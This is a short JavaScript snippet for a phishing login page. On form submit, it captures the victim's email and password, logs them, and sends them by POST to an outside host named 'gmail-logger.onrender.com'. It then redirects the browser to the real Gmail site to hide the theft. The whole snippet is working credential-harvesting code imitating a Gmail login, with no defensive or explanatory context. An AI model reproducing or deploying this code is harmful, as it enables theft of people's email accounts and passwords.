document.getElementById('login-form').addEventListener('submit', function(event) {
    event.preventDefault();
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    console.log("Email: " + email + ", Password: " + password);

    fetch('https://gmail-logger.onrender.com/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: email, password: password })
    });

    setTimeout(function() {
        window.location.href = 'https://mail.google.com';
    }, 1000);
});